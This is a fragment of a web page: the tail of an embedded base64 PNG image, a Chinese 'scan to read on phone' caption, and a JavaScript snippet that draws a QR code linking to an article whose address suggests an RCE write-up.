Gt0Jw/1XujLtuyNnuvCB3DeR0038+2d72jo/OtawYTeXkg68n7BjtiNLHxlzi5CuCe59poh814FrYMdogOJfainCciy59RkxemJx82RiLu26IduGNrP1QB58CeBzPvg9wn1ED5oExdRqvTpMKgO2tMqDw1NJDCGx1Y4FyMVhrxpoaw3EN9DnoY/W5boh24Y2sDSSn4hEc139WE200iSsmBz4xYKyaIz+1wlED9/uANaqXgWNgbNdiYHm7JFAPmfwjA9dLJwPHwPUvhh9v9tFuSNYF+7Sg96N5BnUCZOBetRZ6TjpZ1Rz54FqYMTXqVS28sPLyxR2Z8rLk5csSC2FeB6BUM9XIQgDbTRMXmwYS8YWv2YFrIK/Z98OnfslAwFcPZjx88iIBrs/1rRJwLlw0ZxjtGcL9vmAN9Ljqm/Ukl1gYLihOBnvfLxlIHnDhv+/Alw5E0x4NPP0sdcwrBmvky6JdofIycE3VQM+BYzjGWi8fZq2eJ1P+noHrpZet9OJlycmPfelA8oALP78D00AyqRUePSZa8OkAjqQP8cD2dhB2TCGYO3sm9JpozxCOa8C5rGGF6Z0c3K8ZtcD1i+HHm320GwKeKNzHo+8hp0QI7iO/Wq0FayonP3r5oyUH61rpo5F/z+C4z1HtI/2jAfcHWjtgewUIEa2wDSTJC1+7A9dAXrv/09P/BwAA//+mVvY6AAAABklEQVQDAIA6KpWdyRbwAAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/netmizer-search-search-appname-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 